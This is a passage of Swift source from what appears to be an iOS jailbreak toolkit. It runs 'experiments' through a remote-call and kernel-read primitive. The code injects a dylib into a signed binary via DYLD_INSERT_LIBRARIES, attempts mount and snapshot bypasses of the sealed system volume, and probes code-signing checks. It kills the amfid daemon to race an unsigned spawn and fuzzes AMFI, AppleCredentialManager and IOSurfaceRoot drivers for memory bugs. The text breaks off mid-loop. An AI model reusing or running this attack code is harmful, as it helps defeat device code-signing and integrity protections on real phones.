        if ioSvc != 0 {
            let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
            let connectAddr = sbMem + 0x1A00
            sb[connectAddr].setValue32(0)
            let openRet = RootExecutor.rcall(sb, "IOServiceOpen", ioSvc, taskSelf, 0, connectAddr)
            let ioConnect = sb[connectAddr].value32()
            
            detail += "IOSurfaceRoot: connect=\(ioConnect), ret=0x\(String(format: "%x", openRet))\n"
            
            if openRet == 0 && ioConnect != 0 {
                // Try external method selectors 6-15 (IOSurface has ~30 methods)
                // Selector 6 = create, 9 = get_value, 10 = set_value, etc.
                let scalarIn = sbMem + 0x2000
                let scalarOut = sbMem + 0x2200
                let scalarOutCnt = sbMem + 0x2400
                
                let testSelectors = [6, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
                for sel in testSelectors {
                    sb[scalarIn].setValue64(0)
                    sb[scalarOutCnt].setValue32(16)
                    let ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                                UInt64(ioConnect), UInt64(sel),
                                                0, 0,
                                                scalarOut, scalarOutCnt)
                    if ret == 0 {
                        let out = sb[scalarOut].value64()
                        detail += "  âœ… IOSurf sel \(sel): SUCCESS! out=0x\(String(format: "%llx", out))\n"
                        anySuccess = true
                    } else if ret != 0xe00002bc && ret != 0xe00002c7 {
                        detail += "  âš ï¸ IOSurf sel \(sel): ret=0x\(String(format: "%x", ret))\n"
                    }
                }
                
                RootExecutor.rcall(sb, "IOServiceClose", UInt64(ioConnect))
            }
        } else {
            detail += "IOSurfaceRoot service not found\n"
        }
        RootExecutor.rcall(sb, "free", ioSvcName)
        
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // PATH 5: Spawn signed binary via symlink (already works!)
        // + try to make it load OUR dylib via DYLD_INSERT_LIBRARIES
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        detail += "\nâ•â•â• PATH 5: DYLD_INSERT via env â•â•â•\n"
        
        // Write a fake dylib to /tmp (just Mach-O header)
        let fakeDylib = "/tmp/.dsp_inject.dylib"
        let fakeAddr = remote_alloc_str(rc, fakeDylib)
        RootExecutor.rcall(rc, "unlink", fakeAddr)
        let fakeFd = RootExecutor.rcall(rc, "open", fakeAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        if fakeFd != UInt64(bitPattern: -1) {
            // Write minimal dylib header
            let hdrAddr = mem + 0x800
            // MH_MAGIC_64 + ARM64 + MH_DYLIB
            rc[hdrAddr].setValue64(0x0000000100000CCF)      // magic + cputype
            rc[hdrAddr + 8].setValue64(0x0000000600000000)  // filetype=MH_DYLIB + ncmds=0
            rc[hdrAddr + 16].setValue64(0x0020008500000000) // sizeofcmds=0 + flags
            rc[hdrAddr + 24].setValue64(0)                  // reserved
            RootExecutor.rcall(rc, "write", fakeFd, hdrAddr, 32)
            RootExecutor.rcall(rc, "close", fakeFd)
        }
        
        // Spawn /bin/df (SIGNED) with DYLD_INSERT_LIBRARIES pointing to our dylib
        let envBase = mem + 0x2800
        let dyldEnv = remote_alloc_str(rc, "DYLD_INSERT_LIBRARIES=/tmp/.dsp_inject.dylib")
        let pathEnv = remote_alloc_str(rc, "PATH=/bin:/usr/bin:/sbin")
        rc[envBase].setValue64(dyldEnv)
        rc[envBase + 8].setValue64(pathEnv)
        rc[envBase + 16].setValue64(0)
        
        let signedBin = remote_alloc_str(rc, "/bin/df")
        let argvBase3 = mem + 0x1C00
        rc[argvBase3].setValue64(signedBin)
        rc[argvBase3 + 8].setValue64(0)
        let pidAddr3 = mem + 0x1E00
        rc[pidAddr3].setValue64(0)
        
        let dyldRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr3, signedBin, 0, 0, argvBase3, envBase)
        let dyldPid = rc[pidAddr3].value32()
        RootExecutor.rcall(rc, "usleep", 500000)
        let dyldWait = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
        detail += "Spawn /bin/df + DYLD_INSERT: ret=\(dyldRet), pid=\(dyldPid), wait=\(dyldWait)\n"
        
        if dyldRet == 0 {
            detail += "Spawn succeeded â€” check if dylib was loaded (need output capture)\n"
            // If DYLD_INSERT works â†’ we can inject code into ANY signed process!
        }
        
        RootExecutor.rcall(rc, "free", dyldEnv)
        RootExecutor.rcall(rc, "free", pathEnv)
        RootExecutor.rcall(rc, "free", signedBin)
        RootExecutor.rcall(rc, "free", fakeAddr)
        
        // Cleanup
        RootExecutor.rcall(rc, "unlink", dstPath)
        RootExecutor.rcall(rc, "unlink", remote_alloc_str(rc, fakeDylib))
        RootExecutor.rcall(rc, "free", srcPath)
        RootExecutor.rcall(rc, "free", dstPath)
        
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // SUMMARY
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        detail += "\nâ•â•â• SUMMARY â•â•â•\n"
        detail += "Paths tested: 5\n"
        detail += anySuccess ? "ðŸ”¥ Some paths showed promise!\n" : "All paths blocked by AMFI MAC policy\n"
        
        return ExperimentResult(name: "ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ FINAL ASSAULT", success: anySuccess, detail: detail, timestamp: Date())
    }
    

    // MARK: - Experiment 63: SSV / Mount Bypass
    
    private func expSSVBypass(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        var detail = "SSV / Mount Bypass Research\n\n"
        
        // Test 1: Try mount() syscall variants
        detail += "=== Test 1: mount() syscall ===\n"
        let targetDir = remote_alloc_str(rc, "/var/jb")
        RootExecutor.rcall(rc, "mkdir", targetDir, 0o755)
        
        let nullfs = remote_alloc_str(rc, "nullfs")
        let srcDir = remote_alloc_str(rc, "/usr/bin")
        let mountRet1 = RootExecutor.rcall(rc, "mount", nullfs, targetDir, 0, srcDir)
        let mountErr1 = remote_errno(rc)
        detail += "mount(nullfs): ret=\(mountRet1), errno=\(mountErr1)\n"
        
        let bindfs = remote_alloc_str(rc, "bindfs")
        let mountRet2 = RootExecutor.rcall(rc, "mount", bindfs, targetDir, 0, srcDir)
        let mountErr2 = remote_errno(rc)
        detail += "mount(bindfs): ret=\(mountRet2), errno=\(mountErr2)\n"
        
        RootExecutor.rcall(rc, "free", nullfs)
        RootExecutor.rcall(rc, "free", bindfs)
        RootExecutor.rcall(rc, "free", srcDir)
        
        // Test 2: APFS snapshot
        detail += "\n=== Test 2: APFS Snapshots ===\n"
        let rootPath = remote_alloc_str(rc, "/")
        let rootFd = RootExecutor.rcall(rc, "open", rootPath, UInt64(O_RDONLY), 0)
        detail += "open(/): fd=\(rootFd == UInt64(bitPattern: -1) ? -1 : Int64(rootFd))\n"
        
        if rootFd != UInt64(bitPattern: -1) {
            let snapName = remote_alloc_str(rc, "dsploit_snap")
            let createRet = RootExecutor.rcall(rc, "fs_snapshot_create", rootFd, snapName, 0)
            let createErr = remote_errno(rc)
            detail += "fs_snapshot_create(/): ret=\(createRet), errno=\(createErr)\n"
            if createRet == 0 { detail += "SNAPSHOT CREATED!\n" }
            RootExecutor.rcall(rc, "free", snapName)
            RootExecutor.rcall(rc, "close", rootFd)
        }
        
        // Test 3: Snapshot on /var
        detail += "\n=== Test 3: Snapshot on /var ===\n"
        let varPath = remote_alloc_str(rc, "/private/var")
        let varFd = RootExecutor.rcall(rc, "open", varPath, UInt64(O_RDONLY), 0)
        if varFd != UInt64(bitPattern: -1) {
            let snapName2 = remote_alloc_str(rc, "dsploit_var")
            let createRet2 = RootExecutor.rcall(rc, "fs_snapshot_create", varFd, snapName2, 0)
            let createErr2 = remote_errno(rc)
            detail += "fs_snapshot_create(/var): ret=\(createRet2), errno=\(createErr2)\n"
            if createRet2 == 0 {
                detail += "VAR SNAPSHOT CREATED!\n"
                RootExecutor.rcall(rc, "fs_snapshot_delete", varFd, snapName2, 0)
            }
            RootExecutor.rcall(rc, "free", snapName2)
            RootExecutor.rcall(rc, "close", varFd)
        }
        RootExecutor.rcall(rc, "free", varPath)
        RootExecutor.rcall(rc, "free", rootPath)
        RootExecutor.rcall(rc, "free", targetDir)
        
        // Test 4: Mount flags
        detail += "\n=== Test 4: Mount info ===\n"
        let stPath = remote_alloc_str(rc, "/")
        let stBuf = mem + 0x1000
        if RootExecutor.rcall(rc, "statfs", stPath, stBuf) == 0 {
            let flags = rc[stBuf + 0x28].value32()
            detail += "/ flags: 0x\(String(format: "%x", flags))"
            if flags & 0x1 != 0 { detail += " RDONLY" }
            if flags & 0x1000 != 0 { detail += " LOCAL" }
            detail += "\n"
        }
        RootExecutor.rcall(rc, "free", stPath)
        
        let success = detail.contains("CREATED")
        return ExperimentResult(name: "SSV/Mount bypass", success: success, detail: detail, timestamp: Date())
    }

    // MARK: - Experiment 64: CoreTrust Signature Research
    
    private func expCoreTrustResearch(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        var detail = "CoreTrust Signature Research\n\n"
        let pid = RootExecutor.rcall(rc, "getpid")
        
        // Test 1: Read code signature blob
        detail += "=== Test 1: Code signature blob ===\n"
        let blobBuf = mem + 0x2000
        let csRet = RootExecutor.rcall(rc, "csops", pid, 5, blobBuf, 4096)
        detail += "csops(CS_OPS_BLOB): ret=\(csRet)\n"
        if csRet == 0 {
            let magic = rc[blobBuf].value32()
            let length = rc[blobBuf + 4].value32()
            detail += "magic=0x\(String(format: "%x", magic)), length=\(length)\n"
            if magic == 0xfade0cc0 {
                let count = rc[blobBuf + 8].value32()
                detail += "Valid SuperBlob! count=\(count)\n"
            }
        }
        
        // Test 2: cs_flags analysis
        detail += "\n=== Test 2: CS flags ===\n"
        let statusAddr = mem + 0x1A00
        rc[statusAddr].setValue32(0)
        RootExecutor.rcall(rc, "csops", pid, 0, statusAddr, 4)
        let csFlags = rc[statusAddr].value32()
        detail += "cs_flags: 0x\(String(format: "%x", csFlags))\n"
        if csFlags & 0x100 != 0 { detail += "  CS_PLATFORM_BINARY\n" }
        if csFlags & 0x20000000 != 0 { detail += "  CS_RUNTIME\n" }
        if csFlags & 0x1 != 0 { detail += "  CS_VALID\n" }
        
        // Test 3: MISValidateSignatureAndCopyInfo
        detail += "\n=== Test 3: MIS validation ===\n"
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        // Load Security/MIS framework FIRST (might not be loaded in launchd)
        let fwPath = remote_alloc_str(rc, "/System/Library/Frameworks/Security.framework/Security")
        let fwHandle = RootExecutor.rcall(rc, "dlopen", fwPath, 1)
        RootExecutor.rcall(rc, "free", fwPath)
        let misPath = remote_alloc_str(rc, "/usr/lib/libmis.dylib")
        RootExecutor.rcall(rc, "dlopen", misPath, 1)
        RootExecutor.rcall(rc, "free", misPath)
        
        let misValidate = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, remote_alloc_str(rc, "MISValidateSignatureAndCopyInfo"))
        detail += "Security.framework: \(fwHandle != 0 ? "loaded" : "failed")\n"
        detail += "MISValidateSignatureAndCopyInfo: \(misValidate != 0 ? "FOUND" : "not available")\n"
        
        if misValidate != 0 {
            detail += "\nMIS function available but CANNOT call from launchd (causes panic).\n"
            detail += "MIS internally connects to amfid via XPC — crashes without proper context.\n"
            detail += "Would need to call from amfid itself (which we can't RC into).\n"
        }
        
        // Test 4: Provisioning profile paths
        detail += "\n=== Test 4: Provisioning profiles ===\n"
        let paths = ["/var/MobileDevice/ProvisioningProfiles", "/var/db/MobileIdentity"]
        for path in paths {
            let p = remote_alloc_str(rc, path)
            let ret = RootExecutor.rcall(rc, "stat", p, mem + 0x1000)
            detail += "\(path): \(ret == 0 ? "EXISTS" : "missing")\n"
            RootExecutor.rcall(rc, "free", p)
        }
        
        let success = detail.contains("FOUND") || detail.contains("VALID")
        return ExperimentResult(name: "CoreTrust research", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 65: amfid Kill Race
    
    /// Kill amfid daemon + immediately try to spawn unsigned binary
    /// amfid auto-restarts (KeepAlive) but there's a window where it's dead
    /// If kernel waits for amfid response and times out → might default-allow
    /// SAFE: worst case = respring (amfid restarts, no bootloop)
    private func expAmfidKillRace(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        let mgr = dspmgr.shared
        var detail = "amfid Kill Race Experiment\n\n"
        
        // Step 1: Find amfid PID
        let amfidProc = mgr.findProc(name: "amfid")
        guard amfidProc != 0 else {
            detail += "amfid not found!\n"
            return ExperimentResult(name: "amfid kill race", success: false, detail: detail, timestamp: Date())
        }
        
        let amfidPid = ds_kread32(amfidProc + UInt64(off_proc_p_pid))
        detail += "amfid PID: \(amfidPid)\n"
        
        // Step 2: Prepare copied binary BEFORE killing amfid
        let srcPath = remote_alloc_str(rc, "/bin/df")
        let dstPath = remote_alloc_str(rc, "/tmp/.dsp_race_bin")
        RootExecutor.rcall(rc, "unlink", dstPath)
        
        let sf = RootExecutor.rcall(rc, "open", srcPath, UInt64(O_RDONLY), 0)
        let df = RootExecutor.rcall(rc, "open", dstPath, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o755)
        if sf != UInt64(bitPattern: -1) && df != UInt64(bitPattern: -1) {
            let buf = mem + 0x800
            for _ in 0..<50 {
                let n = RootExecutor.rcall(rc, "read", sf, buf, 2048)
                if n == 0 || n > 2048 { break }
                RootExecutor.rcall(rc, "write", df, buf, n)
            }
            RootExecutor.rcall(rc, "close", sf)
            RootExecutor.rcall(rc, "close", df)
        }
        detail += "Binary prepared at /tmp/.dsp_race_bin\n\n"
        
        // Step 3: Setup spawn args (ready to fire immediately after kill)
        let argvBase = mem + 0x1C00
        rc[argvBase].setValue64(dstPath)
        rc[argvBase + 8].setValue64(0)
        let pidAddr = mem + 0x1E00
        
        // Step 4: KILL amfid!
        detail += "=== KILLING amfid (PID \(amfidPid)) ===\n"
        let killRet = RootExecutor.rcall(rc, "kill", UInt64(amfidPid), 9) // SIGKILL
        detail += "kill(\(amfidPid), SIGKILL): ret=\(killRet)\n"
        
        // Step 5: IMMEDIATELY try to spawn (race window!)
        // No usleep — spawn as fast as possible while amfid is dead
        rc[pidAddr].setValue64(0)
        let spawnRet1 = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPath, 0, 0, argvBase, 0)
        let spawnPid1 = rc[pidAddr].value32()
        detail += "Spawn attempt 1 (immediate): ret=\(spawnRet1), pid=\(spawnPid1)\n"
        
        // Try again quickly
        rc[pidAddr].setValue64(0)
        let spawnRet2 = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPath, 0, 0, argvBase, 0)
        let spawnPid2 = rc[pidAddr].value32()
        detail += "Spawn attempt 2: ret=\(spawnRet2), pid=\(spawnPid2)\n"
        
        // Try once more
        rc[pidAddr].setValue64(0)
        let spawnRet3 = RootExecutor.rcall(rc, "posix_spawn", pidAddr, dstPath, 0, 0, argvBase, 0)
        let spawnPid3 = rc[pidAddr].value32()
        detail += "Spawn attempt 3: ret=\(spawnRet3), pid=\(spawnPid3)\n"
        
        // Step 6: Wait and check if amfid restarted
        RootExecutor.rcall(rc, "usleep", 2000000) // 2s — let amfid restart
        
        let newAmfidProc = mgr.findProc(name: "amfid")
        if newAmfidProc != 0 {
            let newPid = ds_kread32(newAmfidProc + UInt64(off_proc_p_pid))
            detail += "\namfid restarted! New PID: \(newPid)\n"
        } else {
            detail += "\namfid NOT restarted yet (might cause issues)\n"
        }
        
        // Step 7: Analyze results
        detail += "\n=== RESULTS ===\n"
        let anySuccess = spawnRet1 == 0 || spawnRet2 == 0 || spawnRet3 == 0
        
        if anySuccess {
            detail += "SPAWN SUCCEEDED WHILE AMFID WAS DEAD!\n"
            detail += "This means kernel DEFAULT-ALLOWS when amfid unavailable!\n"
            detail += "FULL JAILBREAK PATH: kill amfid + spawn = bypass!\n"
            
            // Wait for spawned process
            RootExecutor.rcall(rc, "usleep", 1000000)
            let statusAddr = mem + 0x380
            rc[statusAddr].setValue32(0)
            RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), statusAddr, UInt64(WNOHANG))
            let status = rc[statusAddr].value32()
            let exited = (status & 0x7F) == 0
            let sig = status & 0x7F
            
            if exited {
                detail += "Process EXITED NORMALLY! Binary executed!\n"
            } else if sig == 9 {
                detail += "Process was SIGKILL'd (amfid restarted and killed it)\n"
                detail += "But spawn DID succeed — need faster execution\n"
            }
        } else {
            detail += "All spawns failed (ret=\(spawnRet1)/\(spawnRet2)/\(spawnRet3))\n"
            if spawnRet1 == 13 {
                detail += "EACCES — kernel enforces AMFI independently of amfid\n"
                detail += "Killing amfid does NOT bypass code signing\n"
            } else {
                detail += "Different error — might be timing related\n"
            }
        }
        
        // Cleanup
        RootExecutor.rcall(rc, "unlink", dstPath)
        RootExecutor.rcall(rc, "free", srcPath)
        RootExecutor.rcall(rc, "free", dstPath)
        
        return ExperimentResult(name: "amfid kill race", success: anySuccess, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 66: IOKit Driver Fuzzer (LAST TRY)
    
    /// Targeted fuzzing of IOKit external methods
    /// Looking for: OOB read/write, type confusion, integer overflow
    /// Targets: AMFI (11 methods), IOSurfaceRoot, AppleCredentialManager
    /// Strategy: send crafted struct inputs that commonly trigger bugs
    private func expIOKitFuzzer() -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "IOKit Fuzzer", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mem = sb.trojanMem
        var detail = "IOKit Driver Targeted Fuzzer\n\n"
        var anomalies: [(String, String)] = []
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        
        // Helper: open a service
        func openService(_ name: String) -> UInt32 {
            let nameAddr = remote_alloc_str(sb, name)
            let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
            guard matchDict != 0 else { RootExecutor.rcall(sb, "free", nameAddr); return 0 }
            let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
            guard svc != 0 else { RootExecutor.rcall(sb, "free", nameAddr); return 0 }
            let connectAddr = mem + 0x1A00
            sb[connectAddr].setValue32(0)
            let ret = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
            RootExecutor.rcall(sb, "free", nameAddr)
            return ret == 0 ? sb[connectAddr].value32() : 0
        }
        
        // Fuzz patterns that commonly trigger bugs
        let fuzzPatterns: [(String, [UInt64])] = [
            ("zeros", [0, 0, 0, 0, 0, 0, 0, 0]),
            ("max_u32", [0xFFFFFFFF, 0xFFFFFFFF, 0, 0, 0, 0, 0, 0]),
            ("max_u64", [0xFFFFFFFFFFFFFFFF, 0, 0, 0, 0, 0, 0, 0]),
            ("negative", [UInt64(bitPattern: -1), UInt64(bitPattern: -2), 0, 0, 0, 0, 0, 0]),
            ("large_size", [0x41414141, 0x7FFFFFFF, 0, 0, 0, 0, 0, 0]),
            ("kernel_ptr", [0xFFFFFFF000000000, 0, 0, 0, 0, 0, 0, 0]),
            ("heap_ptr", [0xFFFFFFFE00000000, 0, 0, 0, 0, 0, 0, 0]),
            ("small_ints", [1, 2, 3, 4, 5, 6, 7, 8]),
        ]
        
        let structIn = mem + 0x2200
        let structOut = mem + 0x2400
        let structOutSize = mem + 0x2600
        let scalarIn = mem + 0x2800
        let scalarOut = mem + 0x2A00
        let scalarOutCnt = mem + 0x2C00
        
        // ═══ FUZZ AMFI (11 active selectors: 2,4,5,6,7,9,11,12,13,14,15) ═══
        detail += "=== AMFI External Methods ===\n"
        let amfiConnect = openService("AppleMobileFileIntegrity")
        
        if amfiConnect != 0 {
            detail += "AMFI connect=\(amfiConnect)\n"
            let amfiSelectors = [2, 4, 5, 6, 7, 9, 11, 12, 13, 14, 15]
            
            for sel in amfiSelectors.prefix(6) {
                for (patName, pattern) in fuzzPatterns.prefix(5) {
                    // Write pattern to struct input
                    for (i, val) in pattern.prefix(4).enumerated() {
                        sb[structIn + UInt64(i * 8)].setValue64(val)
                    }
                    sb[structOutSize].setValue64(256)
                    
                    // Try struct method
                    let ret = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                                UInt64(amfiConnect), UInt64(sel),
                                                structIn, 32,
                                                structOut, structOutSize)
                    
                    let outSize = sb[structOutSize].value64()
                    
                    // Check for anomalies
                    if ret == 0 {
                        anomalies.append(("AMFI sel\(sel) \(patName)", "SUCCESS! outSize=\(outSize)"))
                        detail += "  !! sel \(sel) + \(patName): ret=0, out=\(outSize)\n"
                    } else if ret != 0xe00002c2 && ret != 0xe00002bc && ret != 0xe00002c7 {
                        // Unexpected error code = interesting
                        let retHex = String(format: "0x%x", ret)
                        if ret != 0xe0000001 {
                            anomalies.append(("AMFI sel\(sel) \(patName)", "unusual ret=\(retHex)"))
                            detail += "  ? sel \(sel) + \(patName): ret=\(retHex)\n"
                        }
                    }
                }
            }
            RootExecutor.rcall(sb, "IOServiceClose", UInt64(amfiConnect))
        } else {
            detail += "Cannot open AMFI\n"
        }
        
        // ═══ FUZZ AppleCredentialManager ═══
        detail += "\n=== AppleCredentialManager ===\n"
        let credConnect = openService("AppleCredentialManager")
        
        if credConnect != 0 {
            detail += "CredMgr connect=\(credConnect)\n"
            
            for sel in 0..<10 {
                for (patName, pattern) in fuzzPatterns.prefix(4) {
                    for (i, val) in pattern.prefix(4).enumerated() {
                        sb[structIn + UInt64(i * 8)].setValue64(val)
                    }
                    sb[structOutSize].setValue64(256)
                    
                    let ret = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                                UInt64(credConnect), UInt64(sel),
                                                structIn, 32,
                                                structOut, structOutSize)
                    
                    if ret == 0 {
                        let outSize = sb[structOutSize].value64()
                        anomalies.append(("CredMgr sel\(sel) \(patName)", "SUCCESS! out=\(outSize)"))
                        detail += "  !! sel \(sel) + \(patName): SUCCESS out=\(outSize)\n"
                        
                        // Read output data
                        if outSize > 0 && outSize <= 64 {
                            var outBuf = [UInt8](repeating: 0, count: Int(outSize))
                            sb.remoteRead(structOut, to: &outBuf, size: outSize)
                            let hex = outBuf.prefix(16).map { String(format: "%02x", $0) }.joined(separator: " ")
                            detail += "    data: \(hex)\n"
                        }
                    } else if ret != 0xe00002c2 && ret != 0xe00002bc && ret != 0xe00002c7 && ret != 0xe0000001 {
                        anomalies.append(("CredMgr sel\(sel) \(patName)", "ret=0x\(String(format: "%x", ret))"))
                        detail += "  ? sel \(sel) + \(patName): ret=0x\(String(format: "%x", ret))\n"
                    }
                }
            }
            RootExecutor.rcall(sb, "IOServiceClose", UInt64(credConnect))
        } else {
            detail += "Cannot open CredentialManager\n"
        }
        
        // ═══ FUZZ IOSurfaceRoot with scalar inputs ═══
        detail += "\n=== IOSurfaceRoot (scalar) ===\n"
        let ioSurfConnect = openService("IOSurfaceRoot")
        
        if ioSurfConnect != 0 {
            detail += "IOSurf connect=\(ioSurfConnect)\n"
            
            // IOSurface has methods that take scalar inputs
            // Selectors 0-30, try with various scalar counts
            for sel in [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20] {
                sb[scalarIn].setValue64(0)
                sb[scalarIn + 8].setValue64(0)
                sb[scalarOutCnt].setValue32(16)
                
                let ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                            UInt64(ioSurfConnect), UInt64(sel),
                                            scalarIn, 2,
                                            scalarOut, scalarOutCnt)
                
                if ret == 0 {
                    let outCnt = sb[scalarOutCnt].value32()
                    let val0 = sb[scalarOut].value64()
                    anomalies.append(("IOSurf sel\(sel)", "SUCCESS cnt=\(outCnt) val=0x\(String(format: "%llx", val0))"))
                    detail += "  !! sel \(sel): SUCCESS! cnt=\(outCnt), val=0x\(String(format: "%llx", val0))\n"
                } else if ret != 0xe00002c2 && ret != 0xe00002bc && ret != 0xe00002c7 && ret != 0xe0000001 {
                    detail += "  ? sel \(sel): ret=0x\(String(format: "%x", ret))\n"
                    anomalies.append(("IOSurf sel\(sel)", "ret=0x\(String(format: "%x", ret))"))
                }
            }
            RootExecutor.rcall(sb, "IOServiceClose", UInt64(ioSurfConnect))
        }
        
        // ═══ SUMMARY ═══
        detail += "\n=== SUMMARY ===\n"
        detail += "Anomalies found: \(anomalies.count)\n"
        for (target, result) in anomalies.prefix(15) {
            detail += "  \(target): \(result)\n"
        }
        
        if anomalies.isEmpty {
            detail += "No anomalies — all methods properly reject invalid input.\n"
            detail += "Drivers appear hardened against basic fuzzing.\n"
        } else {
            detail += "\nAnomalies need further investigation!\n"
            detail += "SUCCESS returns = method accepted our input\n"
            detail += "Unusual ret codes = potential edge case\n"
        }
        
        let success = !anomalies.isEmpty
        return ExperimentResult(name: "IOKit Fuzzer (LAST TRY)", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 67: Deep Fuzz AppleCredentialManager sel 0
    
    /// Selector 0 returns 0xfffffffd (-3) = custom error from driver logic
    /// This means our input REACHES the driver code!
    /// Now: find input that triggers different behavior (ret=0, crash, different ret)
    /// Strategy: vary struct size, content patterns, scalar vs struct
    private func expCredMgrDeepFuzz() -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "CredMgr Deep Fuzz", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mem = sb.trojanMem
        var detail = "AppleCredentialManager Selector 0 — Deep Fuzz\n\n"
        var findings: [(String, UInt64)] = []
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        
        // Open AppleCredentialManager
        let nameAddr = remote_alloc_str(sb, "AppleCredentialManager")
        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
        let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
        guard svc != 0 else {
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "CredMgr Deep Fuzz", success: false, detail: "Service not found", timestamp: Date())
        }
        let connectAddr = mem + 0x1A00
        sb[connectAddr].setValue32(0)
        let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
        let connect = sb[connectAddr].value32()
        guard openRet == 0 && connect != 0 else {
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "CredMgr Deep Fuzz", success: false, detail: "Cannot open", timestamp: Date())
        }
        RootExecutor.rcall(sb, "free", nameAddr)
        detail += "connect=\(connect)\n\n"
        
        let structIn = mem + 0x2200
        let structOut = mem + 0x2400
        let structOutSize = mem + 0x2600
        let scalarIn = mem + 0x2800
        let scalarOut = mem + 0x2A00
        let scalarOutCnt = mem + 0x2C00
        
        let baseline: UInt64 = 0xfffffffd  // known return for sel 0
        
        // ═══ TEST 1: Vary struct input SIZE ═══
        detail += "=== Test 1: Vary struct size (sel 0) ===\n"
        let sizes: [UInt64] = [0, 4, 8, 12, 16, 20, 24, 32, 48, 64, 96, 128, 192, 256, 384, 512, 1024, 2048]
        
        for size in sizes {
            // Zero-fill input
            for i in stride(from: 0, to: min(Int(size), 256), by: 8) {
                sb[structIn + UInt64(i)].setValue64(0)
            }
            sb[structOutSize].setValue64(256)
            
            let ret = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                         UInt64(connect), 0,
                                         size == 0 ? 0 : structIn, size,
                                         structOut, structOutSize)
            let outSize = sb[structOutSize].value64()
            
            if ret != baseline {
                detail += "  !! size=\(size): ret=0x\(String(format: "%x", ret)), outSize=\(outSize)\n"
                findings.append(("size=\(size)", ret))
                if ret == 0 {
                    detail += "     SUCCESS! Method accepted this size!\n"
                    // Read output
                    if outSize > 0 && outSize <= 64 {
                        var buf = [UInt8](repeating: 0, count: Int(outSize))
                        sb.remoteRead(structOut, to: &buf, size: outSize)
                        detail += "     output: \(buf.prefix(16).map { String(format: "%02x", $0) }.joined(separator: " "))\n"
                    }
                }
            } else {
                // Same as baseline — note but don't print all
                if size <= 32 || size == 512 || size == 2048 {
                    detail += "  size=\(size): ret=0xfffffffd (baseline)\n"
                }
            }
        }
        
        // ═══ TEST 2: Vary CONTENT at fixed size 32 ═══
        detail += "\n=== Test 2: Vary content (size=32) ===\n"
        let contentPatterns: [(String, [UInt64])] = [
            ("all_0x41", [0x4141414141414141, 0x4141414141414141, 0x4141414141414141, 0x4141414141414141]),
            ("incrementing", [0x0102030405060708, 0x090A0B0C0D0E0F10, 0x1112131415161718, 0x191A1B1C1D1E1F20]),
            ("ptr_pattern", [0x0000000100000001, 0x0000000200000002, 0, 0]),
            ("mach_msg_hdr", [0x00000013_00000000, 0x00000000_00000001, 0, 0]),  // fake mach msg
            ("xpc_dict", [0x0000F000_58504321, 0x0000000100000001, 0, 0]),  // fake XPC
            ("plist_magic", [0x6C70_7362, 0x0000_0100, 0, 0]),  // "bplist00"
            ("credential", [1, 0, 0x0000000100000000, 0]),  // type=1, version, data_ptr
            ("token_req", [0x746F6B65, 0x6E000000, 0, 0]),  // "token\0"
        ]
        
        for (name, pattern) in contentPatterns {
